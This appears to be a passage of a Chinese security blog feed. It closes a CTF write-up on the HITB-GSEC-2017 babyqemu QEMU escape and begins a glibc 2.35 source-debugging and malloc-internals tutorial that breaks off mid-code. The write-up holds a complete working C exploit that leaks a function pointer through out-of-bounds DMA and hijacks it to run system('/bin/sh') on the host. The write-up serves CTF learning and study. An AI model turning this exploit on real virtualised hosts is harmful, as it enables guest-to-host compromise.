class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以在<code>cpu_physical_memory_rw</code>下断点</p><p><img src="https://s2.loli.net/2023/05/10/lrjS5xTY7cMOuUm.png" alt="image-20230510233452449"></p><p>可以看到实际与我们想要泄露的指针偏移为0x558a1d756fe8-0x558a1d755fe8=4096</p><p>把0修改为4096之后再运行一次，便可以获取函数指针</p><p><img src="https://s2.loli.net/2023/05/10/LRbqxG4CdyKBoTi.png" alt="image-20230510234931414"></p><p>需要注意的是最好<code>sleep(1)</code>，调试的时候发现断在<code>cpu_physical_memory_rw</code>后仍然输出了<code>[+] leak_enc =</code>，从运行顺序来说不太合理</p><p>然后就是算出距离system的plt的偏移，然后改写enc指针调用即可，IDA中可以直接查</p><p><img src="https://s2.loli.net/2023/05/10/6eKNGFDzA7pvagX.png" alt="image-20230510235033886"></p><p>调用enc指针在<code>hitb_dma_timer</code>里面有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">   v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">   opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">   cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改cmd进入这个分支就行了，具体方法和前面一样</p><p>所以越界写enc指针为<code>system</code>，然后再<code>dma_buff</code>上面写命令cmd,通过<code>enc(cmd)</code>来调用<code>system(cmd)</code>即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint64_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到dma</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start_enc</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>|<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    <span class="comment">// set_cmd();</span></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc;</span><br><span class="line">    copy_from_dma(<span class="number">4096</span>,&amp;leak_enc,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak_enc = %lx&quot;</span>,leak_enc);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt =  leak_enc  - <span class="number">0x283DD0</span> + <span class="number">0x1FDB18</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system_plt = %lx&quot;</span>,system_plt);</span><br><span class="line">    <span class="keyword">char</span>* cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    copy_to_dma(cmd,<span class="number">0x114</span>,<span class="built_in">strlen</span>(cmd));</span><br><span class="line">    copy_to_dma(&amp;system_plt,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    start_enc(<span class="number">0x114</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/11/ZqIH3mxGpQ2CPDt.png" alt="image-20230511000604080"></p><h2 id="XCTF-华为高校挑战赛决赛-pipeline"><a href="#XCTF-华为高校挑战赛决赛-pipeline" class="headerlink" title="XCTF 华为高校挑战赛决赛 pipeline"></a>XCTF 华为高校挑战赛决赛 pipeline</h2><h2 id="D3CTF2021-D3dev"><a href="#D3CTF2021-D3dev" class="headerlink" title="D3CTF2021 D3dev"></a>D3CTF2021 D3dev</h2><h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><p><a href="https://xz.aliyun.com/t/6562#toc-1">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/">CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu | giantbranch’s blog</a></p><p><a href="https://xz.aliyun.com/t/6562#toc-1">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/09/19/qemu/">XCTF 华为高校挑战赛决赛 QEMU pipeline | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-QEMU-源码调试">【VIRT.0x00】Qemu - I：Qemu 简易食用指南 - arttnba3’s blog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好，我润！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;PCI设备简介&quot;&gt;&lt;a href=&quot;#PCI设备简介&quot; class=&quot;headerlink&quot; title=&quot;PCI设备简介&quot;&gt;&lt;/a&gt;PCI设备简介&lt;/h1&gt;&lt;p&gt;什么是PCI设备，关</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="qemu" scheme="http://phot0n.com/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>libc的源码调试与分析</title>
    <link href="http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2023-03-31T08:37:53.000Z</published>
    <updated>2023-04-06T16:57:00.373Z</updated>
    
    <content type="html"><![CDATA[<p>之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有自己总结一遍来得深刻。而最近确实一直在摆烂，所以借此机会督促自己学点什么东西。</p><p>这里主要分析的是内存管理模块还有一些IO模块</p><h1 id="glibc的源码调试配置"><a href="#glibc的源码调试配置" class="headerlink" title="glibc的源码调试配置"></a>glibc的源码调试配置</h1><p>我们知道，如果我们想用gdb进行源码级调试，我们可以在编译的时候添加<code>-g</code>选项，然后便可以对程序进行调试。但是如果我们想要对glibc进行源码级调试，我们需要带调试版本的glibc</p><p>主要有两种方案，一种是直接下载官方编译好的带符号的glibc，还有一种是自行编译，这里选择了后者,方便我们对源码进行魔改，也方便调试不同版本的源码。</p><p>另外提一句，推荐利用<a href="https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站">https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站</a>)</p><h2 id="下载glibc源码"><a href="#下载glibc源码" class="headerlink" title="下载glibc源码"></a>下载glibc源码</h2><p>在如下网址可以根据偏好下载相应glibc版本的源码。我选择的是glibc-2.35</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;glibc&#x2F;</span><br></pre></td></tr></table></figure><h2 id="编译带符号的glibc"><a href="#编译带符号的glibc" class="headerlink" title="编译带符号的glibc"></a>编译带符号的glibc</h2><p>首先我们需要建立一个编译目录(glibc不允许直接在原目录下进行编译)。这里我在glibc-2.35的上级目录建立了一个名叫<code>build</code>的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir build</span><br></pre></td></tr></table></figure><p>然后执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ CXXFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ ../glibc-2.35/configure --prefix=&lt;/glibc/path&gt;</span><br></pre></td></tr></table></figure><p>(尖括号里面的路径自行替换)笔者在执行的时候出现了make版本过低的错误，以及一个关于LD_LIBRARY_PATH的错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** These critical programs are missing or too old:make...</span><br><span class="line">LD_LIBRARY_PATH shouldn&#39;t contain the current directory when..</span><br></pre></td></tr></table></figure><p>升级完make，然后<code>unset  LD_LIBRARY_PATH</code>即可</p><p>执行完之后会生成Makefile 相关的文件，之后make即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>需要编译挺长时间的。而且中途会出现一些错误。比如说笔者用的是<code>WSL2</code>,曾出现过这个错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1092</span>: undefined reference to `__lll_lock_wait_private<span class="number">&#x27;</span></span><br><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1103</span>: undefined reference to `__lll_lock_wake_private<span class="number">&#x27;</span></span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">Makefile:1234: recipe for target &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/build/elf/ld.so&#x27; failed</span><br><span class="line">make[<span class="number">2</span>]: *** [/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/build/elf/ld.so] Error <span class="number">1</span></span><br><span class="line">make[2]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35/elf&#x27;</span><br><span class="line">Makefile:483: recipe for target &#x27;elf/subdir_lib&#x27; failed</span><br><span class="line">make[<span class="number">1</span>]: *** [elf/subdir_lib] Error <span class="number">2</span></span><br><span class="line">make[1]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35&#x27;</span><br><span class="line">Makefile:9: recipe for target &#x27;all&#x27; failed</span><br><span class="line">make: *** [all] Error <span class="number">2</span></span><br></pre></td></tr></table></figure><p>根据查阅资料，似乎是因为大小写敏感所导致的。(参见<a href="[Linker error · Issue #742 · riscv-collab/riscv-gnu-toolchain (github.com">这个</a>](<a href="https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742">https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742</a>)) 和<a href="[glibc compilation error: undefined reference to `__lll_lock_wait_private&#39; - Stack Overflow](https://stackoverflow.com/questions/73417071/glibc-compilation-error-undefined-reference-to-lll-lock-wait-private">这个</a>) )</p><p>把build目录设置成大小写敏感应该就行了,需要注意的是，要递归地进行目录设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r&#x27;D:\DeskTop\glibc\glibc-2.35\build&#x27;</span></span><br><span class="line"><span class="keyword">for</span> folderName, subfolders, fileNames <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    os.system(<span class="string">&#x27;fsutil.exe file SetCaseSensitiveInfo &#x27;</span> + folderName + <span class="string">&#x27; enable&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;转化完成&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后应该就能修好，如果不行的话可以<code>make clean</code>一下试试</p><p>之后build目录下就有了编译好的libc文件了。</p><p>后面你可以选择利用<code>patchelf</code>修改ld.so与libc，然后就能实现源码调试了</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="内存管理模块"><a href="#内存管理模块" class="headerlink" title="内存管理模块"></a>内存管理模块</h2><p>关于<code>malloc</code>的实现主要在<code>malloc/</code>目录下</p><h3 id="相关数据结构与宏"><a href="#相关数据结构与宏" class="headerlink" title="相关数据结构与宏"></a>相关数据结构与宏</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>首先当然是典中典之chunk的结构。当我们通过malloc等函数申请一块内存区域时，如果成功glibc将会把一个指向chunk的数据部分的指针返回给我们。</p><p>一般我个人喜欢把<code>chunk</code>分为chunk头部分以及数据部分。chunk头包含<code>mchunk_prev_size</code>以及<code>mchunk_size</code>，一般而言是用户不能直接控制的(溢出或者修改指针除外)。而数据部分就是拿来存储用户数据的（包括后面的fd,bk字段，但是这些字段是只有free的时候才会有意义，而在使用阶段被用户拿来作为存储数据）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>INTERNAL_SIZE_T</code>宏定义为<code>size_t</code> 在32位下为4字节，64位下为8字节。</p><p>各个字段解释如下</p><ul><li><code>mchunk_prev_size</code>:如果这个chunk物理相邻的上一个chunk(地址比它小，并且指针差值刚好为前一个chunk的大小)是空闲的，那么这个字段记录的是上面一个chunk的大小。若非空闲，则可以被上一个chunk拿来存储数据</li><li><code>mchunk_size</code>: 记录当前chunk的大小。大小必须是2*SIZE_SZ的整数倍。如果malloc的时候不是整数倍会被自动转化(后面对宏以及malloc函数的解释中有介绍实现)。其中SIZE_SZ在32位系统中为4，64位系统中为8。所以mchunk_size是至少8字节对齐的，也就是说最后3比特位必定是0.因此为了空间复用，我们把最后三位用来记录一些属性，其中从高到低为 :<ul><li><code>NON_MAIN_ARENA</code>:记录该chunk是否不属于主线程，1代表不属于主线程，0代表属于主线程</li><li><code>IS_MAPPED</code>，记录当前 chunk 是否是由 mmap 分配的</li><li><code>PREV_INUSE</code> 记录前一个chunk块是否被分配。</li></ul></li><li><code>fd,bk</code> 。当chunk处于使用状态时，从fd开始(包括fd)是用来存储用户数据的。当chunk处于free状态时，fd指向下一个空闲的chunk，而bk指向上一个空闲的chunk。<strong>需要注意的是这里fd，bk指向的空闲chunk并不一定是物理相邻的。fd，bk的作用是根据chunk的大小放入相应的bin之后用来像链表一样连接每个chunk(打个比方每个bins的头类似一个头节点，然后被free的第一个chunk满足一个bins的大小之后被链进去，第二个被free的chunk同样满足大小之后也会被链进去，此时这两个chunk之间的fd，bk就起到了连接两个chunk的左右。但是视bin的实现而定，有些是单向链表有些事双向</strong></li><li><code>fd_nextsize， bk_nextsize</code>。同<code>fd,bk</code>，不过只有大chunk(满足large chunk的大小范围)才用。具体的我在之前的一篇介绍<code>large bin attack</code>的博客中介绍过</li></ul><h4 id="相关的宏"><a href="#相关的宏" class="headerlink" title="相关的宏"></a>相关的宏</h4><p>这里介绍一些可能会用到的宏（主要是对注释进行渣翻以及给点自己的理解）</p><h5 id="chunk相关的宏"><a href="#chunk相关的宏" class="headerlink" title="chunk相关的宏"></a>chunk相关的宏</h5><p>chunk相关的宏:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tag_at (<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*chunk头的大小，为2*SIZE_SZ(SIZE_SZ在32位系统中为4，64位系统中为8)。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_HDR_SZ (2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把chunk地址转化为数据部分的地址(加上一个chunk头的大小即可) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个和上面的chunk2mem_tag差不多，但是在使用了tag时会提取正确的tag(一些系统支持tag的概念，不过这不是我们关注的重点,当成不使用tag即可*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem_tag(p) ((void*)tag_at ((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把用户使用的数据部分的地址转化为chunk地址(减去一个chunk头的大小即可) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最小可能的chunk大小 （fd_nextsize在malloc_chunk中的偏移)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">/*可分配的对齐chunk的最小大小 这个MALLOC_ALIGN_MASK可以在某处注释中找到(MALLOC_ALIGN_MASK is CHUNK_HDR_SZ-1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">/*检查某个chunk是否对齐(判断末尾3(32位下)/4(64位下)比特位是否是0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT定义在sysdeps/generic/malloc-alignment.h中，其定义如下</span></span><br><span class="line"><span class="comment">#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="comment">  ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br><span class="line"><span class="comment">简而言之是取2 * SIZE_SZ与__alignof__ (long double)中较小的那个</span></span><br><span class="line"><span class="comment">其中__alignof__是获取类型的对齐结果</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*misaligned_chunk(p) 检查是否对齐，返回的是一个与值结果，如果未对齐返回的是非0*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == CHUNK_HDR_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">/* Note: This must be a macro that evaluates to a compile time constant</span></span><br><span class="line"><span class="comment">   if passed a literal constant.  */</span></span><br><span class="line"><span class="comment">/*将请求的大小转化为实际分配的size大小。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if REQ overflows when padded and aligned and if the resulting value</span></span><br><span 